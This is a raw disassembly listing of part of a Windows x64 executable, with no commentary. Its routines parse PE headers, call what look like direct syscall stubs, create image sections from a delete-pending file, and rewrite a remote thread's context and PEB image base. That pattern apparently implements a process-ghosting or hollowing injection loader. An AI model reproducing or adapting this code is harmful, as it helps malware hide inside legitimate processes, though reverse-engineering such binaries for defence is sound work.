   1400046d7:	c7 44 24 28 20 00 00 	movl   $0x20,0x28(%rsp)
   1400046de:	00 
   1400046df:	4c 8d 0d 5a 79 38 00 	lea    0x38795a(%rip),%r9        # 0x14038c040
   1400046e6:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   1400046ed:	00 
   1400046ee:	e8 b4 0a 00 00       	call   0x1400051a7
   1400046f3:	85 c0                	test   %eax,%eax
   1400046f5:	0f 88 fd 00 00 00    	js     0x1400047f8
   1400046fb:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   140004700:	48 83 fe ff          	cmp    $0xffffffffffffffff,%rsi
   140004704:	0f 84 ee 00 00 00    	je     0x1400047f8
   14000470a:	49 89 f8             	mov    %rdi,%r8
   14000470d:	c7 44 24 20 05 00 00 	movl   $0x5,0x20(%rsp)
   140004714:	00 
   140004715:	41 b9 18 00 00 00    	mov    $0x18,%r9d
   14000471b:	48 89 f1             	mov    %rsi,%rcx
   14000471e:	48 c7 44 24 70 00 00 	movq   $0x0,0x70(%rsp)
   140004725:	00 00 
   140004727:	48 8d 3d 12 79 38 00 	lea    0x387912(%rip),%rdi        # 0x14038c040
   14000472e:	48 c7 44 24 78 00 00 	movq   $0x0,0x78(%rsp)
   140004735:	00 00 
   140004737:	48 89 fa             	mov    %rdi,%rdx
   14000473a:	48 c7 84 24 80 00 00 	movq   $0x0,0x80(%rsp)
   140004741:	00 00 00 00 00 
   140004746:	e8 07 0b 00 00       	call   0x140005252
   14000474b:	85 c0                	test   %eax,%eax
   14000474d:	0f 88 9d 00 00 00    	js     0x1400047f0
   140004753:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   140004758:	45 31 c0             	xor    %r8d,%r8d
   14000475b:	4d 89 e1             	mov    %r12,%r9
   14000475e:	48 89 ea             	mov    %rbp,%rdx
   140004761:	48 c7 44 24 58 00 00 	movq   $0x0,0x58(%rsp)
   140004768:	00 00 
   14000476a:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140004771:	89 03                	mov    %eax,(%rbx)
   140004773:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   14000477a:	00 
   14000477b:	c7 44 24 20 00 30 00 	movl   $0x3000,0x20(%rsp)
   140004782:	00 
   140004783:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140004788:	e8 4d 0a 00 00       	call   0x1400051da
   14000478d:	85 c0                	test   %eax,%eax
   14000478f:	78 7f                	js     0x140004810
   140004791:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
   140004798:	00 00 
   14000479a:	45 31 c9             	xor    %r9d,%r9d
   14000479d:	45 31 c0             	xor    %r8d,%r8d
   1400047a0:	31 d2                	xor    %edx,%edx
   1400047a2:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   1400047a9:	00 00 
   1400047ab:	8b 03                	mov    (%rbx),%eax
   1400047ad:	48 89 f1             	mov    %rsi,%rcx
   1400047b0:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400047b5:	89 44 24 30          	mov    %eax,0x30(%rsp)
   1400047b9:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   1400047be:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400047c3:	e8 a0 09 00 00       	call   0x140005168
   1400047c8:	48 89 f1             	mov    %rsi,%rcx
   1400047cb:	89 c7                	mov    %eax,%edi
   1400047cd:	e8 ba 09 00 00       	call   0x14000518c
   1400047d2:	85 ff                	test   %edi,%edi
   1400047d4:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   1400047d9:	78 4d                	js     0x140004828
   1400047db:	48 81 c4 a0 00 00 00 	add    $0xa0,%rsp
   1400047e2:	5b                   	pop    %rbx
   1400047e3:	5e                   	pop    %rsi
   1400047e4:	5f                   	pop    %rdi
   1400047e5:	5d                   	pop    %rbp
   1400047e6:	41 5c                	pop    %r12
   1400047e8:	c3                   	ret
   1400047e9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400047f0:	48 89 f1             	mov    %rsi,%rcx
   1400047f3:	e8 94 09 00 00       	call   0x14000518c
   1400047f8:	31 c0                	xor    %eax,%eax
   1400047fa:	48 81 c4 a0 00 00 00 	add    $0xa0,%rsp
   140004801:	5b                   	pop    %rbx
   140004802:	5e                   	pop    %rsi
   140004803:	5f                   	pop    %rdi
   140004804:	5d                   	pop    %rbp
   140004805:	41 5c                	pop    %r12
   140004807:	c3                   	ret
   140004808:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000480f:	00 
   140004810:	48 89 f1             	mov    %rsi,%rcx
   140004813:	e8 74 09 00 00       	call   0x14000518c
   140004818:	c7 03 00 00 00 00    	movl   $0x0,(%rbx)
   14000481e:	31 c0                	xor    %eax,%eax
   140004820:	eb d8                	jmp    0x1400047fa
   140004822:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004828:	c7 03 00 00 00 00    	movl   $0x0,(%rbx)
   14000482e:	31 c0                	xor    %eax,%eax
   140004830:	eb c8                	jmp    0x1400047fa
   140004832:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140004839:	00 00 00 00 
   14000483d:	0f 1f 00             	nopl   (%rax)
   140004840:	55                   	push   %rbp
   140004841:	57                   	push   %rdi
   140004842:	56                   	push   %rsi
   140004843:	53                   	push   %rbx
   140004844:	48 81 ec b8 00 00 00 	sub    $0xb8,%rsp
   14000484b:	48 89 cb             	mov    %rcx,%rbx
   14000484e:	48 89 d6             	mov    %rdx,%rsi
   140004851:	44 89 c5             	mov    %r8d,%ebp
   140004854:	e8 d7 fb ff ff       	call   0x140004430
   140004859:	31 c0                	xor    %eax,%eax
   14000485b:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004860:	49 89 d8             	mov    %rbx,%r8
   140004863:	48 8d bc 24 80 00 00 	lea    0x80(%rsp),%rdi
   14000486a:	00 
   14000486b:	f3 48 ab             	rep stos %rax,(%rdi)
   14000486e:	48 8d bc 24 80 00 00 	lea    0x80(%rsp),%rdi
   140004875:	00 
   140004876:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   14000487b:	48 89 f9             	mov    %rdi,%rcx
   14000487e:	e8 ed f9 ff ff       	call   0x140004270
   140004883:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   140004888:	49 89 f8             	mov    %rdi,%r8
   14000488b:	c7 44 24 50 00 00 00 	movl   $0x0,0x50(%rsp)
   140004892:	00 
   140004893:	48 c7 44 24 48 00 00 	movq   $0x0,0x48(%rsp)
   14000489a:	00 00 
   14000489c:	4c 8d 0d 9d 77 38 00 	lea    0x38779d(%rip),%r9        # 0x14038c040
   1400048a3:	ba 00 00 11 c0       	mov    $0xc0110000,%edx
   1400048a8:	c7 44 24 40 20 00 00 	movl   $0x20,0x40(%rsp)
   1400048af:	00 
   1400048b0:	c7 44 24 38 00 00 00 	movl   $0x0,0x38(%rsp)
   1400048b7:	00 
   1400048b8:	c7 44 24 30 03 00 00 	movl   $0x3,0x30(%rsp)
   1400048bf:	00 
   1400048c0:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   1400048c7:	00 
   1400048c8:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400048cf:	00 00 
   1400048d1:	e8 74 08 00 00       	call   0x14000514a
   1400048d6:	85 c0                	test   %eax,%eax
   1400048d8:	78 66                	js     0x140004940
   1400048da:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   1400048df:	48 83 ff ff          	cmp    $0xffffffffffffffff,%rdi
   1400048e3:	74 5b                	je     0x140004940
   1400048e5:	48 8d 05 54 77 38 00 	lea    0x387754(%rip),%rax        # 0x14038c040
   1400048ec:	45 31 c9             	xor    %r9d,%r9d
   1400048ef:	31 d2                	xor    %edx,%edx
   1400048f1:	89 6c 24 30          	mov    %ebp,0x30(%rsp)
   1400048f5:	45 31 c0             	xor    %r8d,%r8d
   1400048f8:	48 89 f9             	mov    %rdi,%rcx
   1400048fb:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
   140004902:	00 00 
   140004904:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   14000490b:	00 00 
   14000490d:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   140004912:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004917:	e8 3d 08 00 00       	call   0x140005159
   14000491c:	48 89 f9             	mov    %rdi,%rcx
   14000491f:	89 c3                	mov    %eax,%ebx
   140004921:	e8 66 08 00 00       	call   0x14000518c
   140004926:	89 d8                	mov    %ebx,%eax
   140004928:	f7 d0                	not    %eax
   14000492a:	c1 e8 1f             	shr    $0x1f,%eax
   14000492d:	48 81 c4 b8 00 00 00 	add    $0xb8,%rsp
   140004934:	5b                   	pop    %rbx
   140004935:	5e                   	pop    %rsi
   140004936:	5f                   	pop    %rdi
   140004937:	5d                   	pop    %rbp
   140004938:	c3                   	ret
   140004939:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004940:	31 c0                	xor    %eax,%eax
   140004942:	48 81 c4 b8 00 00 00 	add    $0xb8,%rsp
   140004949:	5b                   	pop    %rbx
   14000494a:	5e                   	pop    %rsi
   14000494b:	5f                   	pop    %rdi
   14000494c:	5d                   	pop    %rbp
   14000494d:	c3                   	ret
   14000494e:	66 90                	xchg   %ax,%ax
   140004950:	57                   	push   %rdi
   140004951:	48 83 ec 60          	sub    $0x60,%rsp
   140004955:	31 c0                	xor    %eax,%eax
   140004957:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   14000495c:	49 89 c8             	mov    %rcx,%r8
   14000495f:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004964:	f3 48 ab             	rep stos %rax,(%rdi)
   140004967:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   14000496c:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140004971:	48 89 f9             	mov    %rdi,%rcx
   140004974:	e8 f7 f8 ff ff       	call   0x140004270
   140004979:	48 89 f9             	mov    %rdi,%rcx
   14000497c:	e8 f3 07 00 00       	call   0x140005174
   140004981:	f7 d0                	not    %eax
   140004983:	c1 e8 1f             	shr    $0x1f,%eax
   140004986:	48 83 c4 60          	add    $0x60,%rsp
   14000498a:	5f                   	pop    %rdi
   14000498b:	c3                   	ret
   14000498c:	0f 1f 40 00          	nopl   0x0(%rax)
   140004990:	57                   	push   %rdi
   140004991:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   140004998:	31 c0                	xor    %eax,%eax
   14000499a:	48 8d 7c 24 60       	lea    0x60(%rsp),%rdi
   14000499f:	49 89 c8             	mov    %rcx,%r8
   1400049a2:	b9 06 00 00 00       	mov    $0x6,%ecx
   1400049a7:	f3 48 ab             	rep stos %rax,(%rdi)
   1400049aa:	48 8d 7c 24 60       	lea    0x60(%rsp),%rdi
   1400049af:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400049b4:	48 89 f9             	mov    %rdi,%rcx
   1400049b7:	e8 b4 f8 ff ff       	call   0x140004270
   1400049bc:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   1400049c1:	48 89 f9             	mov    %rdi,%rcx
   1400049c4:	e8 7d 08 00 00       	call   0x140005246
   1400049c9:	f7 d0                	not    %eax
   1400049cb:	c1 e8 1f             	shr    $0x1f,%eax
   1400049ce:	48 81 c4 90 00 00 00 	add    $0x90,%rsp
   1400049d5:	5f                   	pop    %rdi
   1400049d6:	c3                   	ret
   1400049d7:	90                   	nop
   1400049d8:	90                   	nop
   1400049d9:	90                   	nop
   1400049da:	90                   	nop
   1400049db:	90                   	nop
   1400049dc:	90                   	nop
   1400049dd:	90                   	nop
   1400049de:	90                   	nop
   1400049df:	90                   	nop
   1400049e0:	55                   	push   %rbp
   1400049e1:	57                   	push   %rdi
   1400049e2:	56                   	push   %rsi
   1400049e3:	53                   	push   %rbx
   1400049e4:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   1400049eb:	48 89 d7             	mov    %rdx,%rdi
   1400049ee:	44 89 c6             	mov    %r8d,%esi
   1400049f1:	e8 5a fb ff ff       	call   0x140004550
   1400049f6:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1400049fa:	48 89 c3             	mov    %rax,%rbx
   1400049fd:	0f 84 b3 00 00 00    	je     0x140004ab6
   140004a03:	48 8d 6c 24 70       	lea    0x70(%rsp),%rbp
   140004a08:	c7 44 24 20 0d 00 00 	movl   $0xd,0x20(%rsp)
   140004a0f:	00 
   140004a10:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140004a16:	48 89 c1             	mov    %rax,%rcx
   140004a19:	4c 8d 44 24 5f       	lea    0x5f(%rsp),%r8
   140004a1e:	48 89 ea             	mov    %rbp,%rdx
   140004a21:	48 c7 44 24 70 00 00 	movq   $0x0,0x70(%rsp)
   140004a28:	00 00 
   140004a2a:	48 c7 44 24 78 00 00 	movq   $0x0,0x78(%rsp)
   140004a31:	00 00 
   140004a33:	c6 44 24 5f 01       	movb   $0x1,0x5f(%rsp)
   140004a38:	e8 f2 06 00 00       	call   0x14000512f
   140004a3d:	85 c0                	test   %eax,%eax
   140004a3f:	78 75                	js     0x140004ab6
   140004a41:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   140004a46:	45 31 c9             	xor    %r9d,%r9d
   140004a49:	45 31 c0             	xor    %r8d,%r8d
   140004a4c:	89 74 24 30          	mov    %esi,0x30(%rsp)
   140004a50:	31 d2                	xor    %edx,%edx
   140004a52:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140004a57:	48 89 d9             	mov    %rbx,%rcx
   140004a5a:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
   140004a61:	00 00 
   140004a63:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   140004a68:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   140004a6d:	48 c7 44 24 60 00 00 	movq   $0x0,0x60(%rsp)
   140004a74:	00 00 
   140004a76:	e8 de 06 00 00       	call   0x140005159
   140004a7b:	85 c0                	test   %eax,%eax
   140004a7d:	78 37                	js     0x140004ab6
   140004a7f:	45 31 c9             	xor    %r9d,%r9d
   140004a82:	45 31 c0             	xor    %r8d,%r8d
   140004a85:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140004a8a:	ba 1f 00 0f 00       	mov    $0xf001f,%edx
   140004a8f:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   140004a94:	c7 44 24 28 00 00 00 	movl   $0x1000000,0x28(%rsp)
   140004a9b:	01 
   140004a9c:	c7 44 24 20 02 00 00 	movl   $0x2,0x20(%rsp)
   140004aa3:	00 
   140004aa4:	48 c7 44 24 68 00 00 	movq   $0x0,0x68(%rsp)
   140004aab:	00 00 
   140004aad:	e8 ce 06 00 00       	call   0x140005180
   140004ab2:	85 c0                	test   %eax,%eax
   140004ab4:	74 1a                	je     0x140004ad0
   140004ab6:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   140004abd:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   140004ac4:	5b                   	pop    %rbx
   140004ac5:	5e                   	pop    %rsi
   140004ac6:	5f                   	pop    %rdi
   140004ac7:	5d                   	pop    %rbp
   140004ac8:	c3                   	ret
   140004ac9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004ad0:	48 89 d9             	mov    %rbx,%rcx
   140004ad3:	e8 b4 06 00 00       	call   0x14000518c
   140004ad8:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   140004add:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   140004ae4:	5b                   	pop    %rbx
   140004ae5:	5e                   	pop    %rsi
   140004ae6:	5f                   	pop    %rdi
   140004ae7:	5d                   	pop    %rbp
   140004ae8:	c3                   	ret
   140004ae9:	90                   	nop
   140004aea:	90                   	nop
   140004aeb:	90                   	nop
   140004aec:	90                   	nop
   140004aed:	90                   	nop
   140004aee:	90                   	nop
   140004aef:	90                   	nop
   140004af0:	31 c0                	xor    %eax,%eax
   140004af2:	48 85 c9             	test   %rcx,%rcx
   140004af5:	74 23                	je     0x140004b1a
   140004af7:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
   140004afc:	75 1c                	jne    0x140004b1a
   140004afe:	48 63 51 3c          	movslq 0x3c(%rcx),%rdx
   140004b02:	81 fa 00 04 00 00    	cmp    $0x400,%edx
   140004b08:	7f 10                	jg     0x140004b1a
   140004b0a:	48 8d 04 11          	lea    (%rcx,%rdx,1),%rax
   140004b0e:	31 d2                	xor    %edx,%edx
   140004b10:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
   140004b16:	48 0f 45 c2          	cmovne %rdx,%rax
   140004b1a:	c3                   	ret
   140004b1b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004b20:	31 d2                	xor    %edx,%edx
   140004b22:	48 85 c9             	test   %rcx,%rcx
   140004b25:	74 20                	je     0x140004b47
   140004b27:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
   140004b2c:	75 19                	jne    0x140004b47
   140004b2e:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   140004b32:	3d 00 04 00 00       	cmp    $0x400,%eax
   140004b37:	7f 0e                	jg     0x140004b47
   140004b39:	48 01 c1             	add    %rax,%rcx
   140004b3c:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   140004b42:	75 03                	jne    0x140004b47
   140004b44:	8b 51 28             	mov    0x28(%rcx),%edx
   140004b47:	89 d0                	mov    %edx,%eax
   140004b49:	c3                   	ret
   140004b4a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004b50:	57                   	push   %rdi
   140004b51:	56                   	push   %rsi
   140004b52:	53                   	push   %rbx
   140004b53:	48 81 ec f0 04 00 00 	sub    $0x4f0,%rsp
   140004b5a:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   140004b60:	48 8d 74 24 20       	lea    0x20(%rsp),%rsi
   140004b65:	48 89 cb             	mov    %rcx,%rbx
   140004b68:	48 89 d7             	mov    %rdx,%rdi
   140004b6b:	48 89 f1             	mov    %rsi,%rcx
   140004b6e:	31 d2                	xor    %edx,%edx
   140004b70:	e8 5b 6f 00 00       	call   0x14000bad0
   140004b75:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140004b79:	48 89 f2             	mov    %rsi,%rdx
   140004b7c:	c7 44 24 50 02 00 10 	movl   $0x100002,0x50(%rsp)
   140004b83:	00 
   140004b84:	e8 39 06 00 00       	call   0x1400051c2
   140004b89:	89 c2                	mov    %eax,%edx
   140004b8b:	31 c0                	xor    %eax,%eax
   140004b8d:	85 d2                	test   %edx,%edx
   140004b8f:	78 19                	js     0x140004baa
   140004b91:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140004b95:	48 89 f2             	mov    %rsi,%rdx
   140004b98:	48 89 bc 24 a0 00 00 	mov    %rdi,0xa0(%rsp)
   140004b9f:	00 
   140004ba0:	e8 29 06 00 00       	call   0x1400051ce
   140004ba5:	f7 d0                	not    %eax
   140004ba7:	c1 e8 1f             	shr    $0x1f,%eax
   140004baa:	48 81 c4 f0 04 00 00 	add    $0x4f0,%rsp
   140004bb1:	5b                   	pop    %rbx
   140004bb2:	5e                   	pop    %rsi
   140004bb3:	5f                   	pop    %rdi
   140004bb4:	c3                   	ret
   140004bb5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140004bbc:	00 00 00 00 
   140004bc0:	53                   	push   %rbx
   140004bc1:	48 81 ec f0 04 00 00 	sub    $0x4f0,%rsp
   140004bc8:	31 d2                	xor    %edx,%edx
   140004bca:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   140004bd0:	48 89 cb             	mov    %rcx,%rbx
   140004bd3:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004bd8:	e8 f3 6e 00 00       	call   0x14000bad0
   140004bdd:	c7 44 24 50 02 00 10 	movl   $0x100002,0x50(%rsp)
   140004be4:	00 
   140004be5:	48 89 c1             	mov    %rax,%rcx
   140004be8:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140004bec:	48 89 ca             	mov    %rcx,%rdx
   140004bef:	48 89 c1             	mov    %rax,%rcx
   140004bf2:	e8 cb 05 00 00       	call   0x1400051c2
   140004bf7:	89 c2                	mov    %eax,%edx
   140004bf9:	31 c0                	xor    %eax,%eax
   140004bfb:	85 d2                	test   %edx,%edx
   140004bfd:	78 08                	js     0x140004c07
   140004bff:	48 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%rax
   140004c06:	00 
   140004c07:	48 81 c4 f0 04 00 00 	add    $0x4f0,%rsp
   140004c0e:	5b                   	pop    %rbx
   140004c0f:	c3                   	ret
   140004c10:	53                   	push   %rbx
   140004c11:	48 83 ec 40          	sub    $0x40,%rsp
   140004c15:	48 89 54 24 58       	mov    %rdx,0x58(%rsp)
   140004c1a:	31 d2                	xor    %edx,%edx
   140004c1c:	48 85 c9             	test   %rcx,%rcx
   140004c1f:	4c 89 c3             	mov    %r8,%rbx
   140004c22:	74 20                	je     0x140004c44
   140004c24:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
   140004c29:	75 19                	jne    0x140004c44
   140004c2b:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   140004c2f:	3d 00 04 00 00       	cmp    $0x400,%eax
   140004c34:	7f 0e                	jg     0x140004c44
   140004c36:	48 01 c1             	add    %rax,%rcx
   140004c39:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   140004c3f:	75 03                	jne    0x140004c44
   140004c41:	8b 51 28             	mov    0x28(%rcx),%edx
   140004c44:	48 03 54 24 58       	add    0x58(%rsp),%rdx
   140004c49:	48 89 d9             	mov    %rbx,%rcx
   140004c4c:	e8 ff fe ff ff       	call   0x140004b50
   140004c51:	85 c0                	test   %eax,%eax
   140004c53:	75 0b                	jne    0x140004c60
   140004c55:	31 c0                	xor    %eax,%eax
   140004c57:	48 83 c4 40          	add    $0x40,%rsp
   140004c5b:	5b                   	pop    %rbx
   140004c5c:	c3                   	ret
   140004c5d:	0f 1f 00             	nopl   (%rax)
   140004c60:	48 89 d9             	mov    %rbx,%rcx
   140004c63:	e8 58 ff ff ff       	call   0x140004bc0
   140004c68:	48 85 c0             	test   %rax,%rax
   140004c6b:	74 e8                	je     0x140004c55
   140004c6d:	48 8b 0b             	mov    (%rbx),%rcx
   140004c70:	48 8d 50 10          	lea    0x10(%rax),%rdx
   140004c74:	41 b9 08 00 00 00    	mov    $0x8,%r9d
   140004c7a:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   140004c81:	00 00 
   140004c83:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   140004c88:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004c8d:	4c 8d 44 24 58       	lea    0x58(%rsp),%r8
   140004c92:	e8 4f 05 00 00       	call   0x1400051e6
   140004c97:	f7 d0                	not    %eax
   140004c99:	c1 e8 1f             	shr    $0x1f,%eax
   140004c9c:	48 83 c4 40          	add    $0x40,%rsp
   140004ca0:	5b                   	pop    %rbx
   140004ca1:	c3                   	ret
   140004ca2:	90                   	nop
   140004ca3:	90                   	nop
   140004ca4:	90                   	nop
   140004ca5:	90                   	nop
   140004ca6:	90                   	nop
   140004ca7:	90                   	nop
   140004ca8:	90                   	nop
   140004ca9:	90                   	nop
   140004caa:	90                   	nop
   140004cab:	90                   	nop
   140004cac:	90                   	nop
   140004cad:	90                   	nop
   140004cae:	90                   	nop
   140004caf:	90                   	nop
   140004cb0:	48 83 ec 68          	sub    $0x68,%rsp
   140004cb4:	45 31 c9             	xor    %r9d,%r9d
   140004cb7:	c7 44 24 48 02 00 00 	movl   $0x2,0x48(%rsp)
   140004cbe:	00 
   140004cbf:	4c 8d 44 24 58       	lea    0x58(%rsp),%r8
   140004cc4:	48 89 c8             	mov    %rcx,%rax
   140004cc7:	48 89 d1             	mov    %rdx,%rcx
   140004cca:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140004ccf:	c7 44 24 40 00 00 00 	movl   $0x0,0x40(%rsp)
   140004cd6:	00 
   140004cd7:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
   140004cdc:	48 89 c2             	mov    %rax,%rdx
   140004cdf:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%rsp)
   140004ce6:	00 
   140004ce7:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
   140004cee:	00 00 
   140004cf0:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140004cf7:	00 00 
   140004cf9:	48 c7 44 24 50 00 00 	movq   $0x0,0x50(%rsp)
   140004d00:	00 00 
   140004d02:	48 c7 44 24 58 00 00 	movq   $0x0,0x58(%rsp)
   140004d09:	00 00 
   140004d0b:	e8 8b 04 00 00       	call   0x14000519b
   140004d10:	3d 03 00 00 40       	cmp    $0x40000003,%eax
   140004d15:	74 06                	je     0x140004d1d
   140004d17:	31 d2                	xor    %edx,%edx
   140004d19:	85 c0                	test   %eax,%eax
   140004d1b:	75 05                	jne    0x140004d22
   140004d1d:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
   140004d22:	48 89 d0             	mov    %rdx,%rax
   140004d25:	48 83 c4 68          	add    $0x68,%rsp
   140004d29:	c3                   	ret
   140004d2a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004d30:	41 54                	push   %r12
   140004d32:	55                   	push   %rbp
   140004d33:	57                   	push   %rdi
   140004d34:	56                   	push   %rsi
   140004d35:	53                   	push   %rbx
   140004d36:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp
   140004d3a:	4c 89 c5             	mov    %r8,%rbp
   140004d3d:	44 8b 84 24 d0 00 00 	mov    0xd0(%rsp),%r8d
   140004d44:	00 
   140004d45:	48 89 d7             	mov    %rdx,%rdi
   140004d48:	4c 89 ca             	mov    %r9,%rdx
   140004d4b:	4c 89 ce             	mov    %r9,%rsi
   140004d4e:	e8 8d fc ff ff       	call   0x1400049e0
   140004d53:	48 89 c3             	mov    %rax,%rbx
   140004d56:	48 8d 40 ff          	lea    -0x1(%rax),%rax
   140004d5a:	48 83 f8 fd          	cmp    $0xfffffffffffffffd,%rax
   140004d5e:	76 18                	jbe    0x140004d78
   140004d60:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   140004d67:	48 83 ec 80          	sub    $0xffffffffffffff80,%rsp
   140004d6b:	5b                   	pop    %rbx
   140004d6c:	5e                   	pop    %rsi
   140004d6d:	5f                   	pop    %rdi
   140004d6e:	5d                   	pop    %rbp
   140004d6f:	41 5c                	pop    %r12
   140004d71:	c3                   	ret
   140004d72:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004d78:	4c 8b 8c 24 d8 00 00 	mov    0xd8(%rsp),%r9
   140004d7f:	00 
   140004d80:	4c 8d 64 24 60       	lea    0x60(%rsp),%r12
   140004d85:	48 89 fa             	mov    %rdi,%rdx
   140004d88:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   140004d8f:	00 
   140004d90:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
   140004d97:	00 
   140004d98:	49 89 e8             	mov    %rbp,%r8
   140004d9b:	4c 89 e1             	mov    %r12,%rcx
   140004d9e:	e8 4d e5 ff ff       	call   0x1400032f0
   140004da3:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   140004da8:	48 83 fa ff          	cmp    $0xffffffffffffffff,%rdx
   140004dac:	74 b2                	je     0x140004d60
   140004dae:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140004db3:	45 31 c9             	xor    %r9d,%r9d
   140004db6:	c7 44 24 48 02 00 00 	movl   $0x2,0x48(%rsp)
   140004dbd:	00 
   140004dbe:	48 89 d9             	mov    %rbx,%rcx
   140004dc1:	c7 44 24 40 00 00 00 	movl   $0x0,0x40(%rsp)
   140004dc8:	00 
   140004dc9:	4c 8d 44 24 58       	lea    0x58(%rsp),%r8
   140004dce:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%rsp)
   140004dd5:	00 
   140004dd6:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140004ddb:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
   140004de2:	00 00 
   140004de4:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140004deb:	00 00 
   140004ded:	48 c7 44 24 50 00 00 	movq   $0x0,0x50(%rsp)
   140004df4:	00 00 
   140004df6:	48 c7 44 24 58 00 00 	movq   $0x0,0x58(%rsp)
   140004dfd:	00 00 
   140004dff:	e8 97 03 00 00       	call   0x14000519b
   140004e04:	85 c0                	test   %eax,%eax
   140004e06:	74 0b                	je     0x140004e13
   140004e08:	3d 03 00 00 40       	cmp    $0x40000003,%eax
   140004e0d:	0f 85 4d ff ff ff    	jne    0x140004d60
   140004e13:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
   140004e18:	48 85 d2             	test   %rdx,%rdx
   140004e1b:	0f 84 3f ff ff ff    	je     0x140004d60
   140004e21:	4d 89 e0             	mov    %r12,%r8
   140004e24:	48 89 f1             	mov    %rsi,%rcx
   140004e27:	e8 e4 fd ff ff       	call   0x140004c10
   140004e2c:	84 c0                	test   %al,%al
   140004e2e:	0f 84 2c ff ff ff    	je     0x140004d60
   140004e34:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140004e39:	31 d2                	xor    %edx,%edx
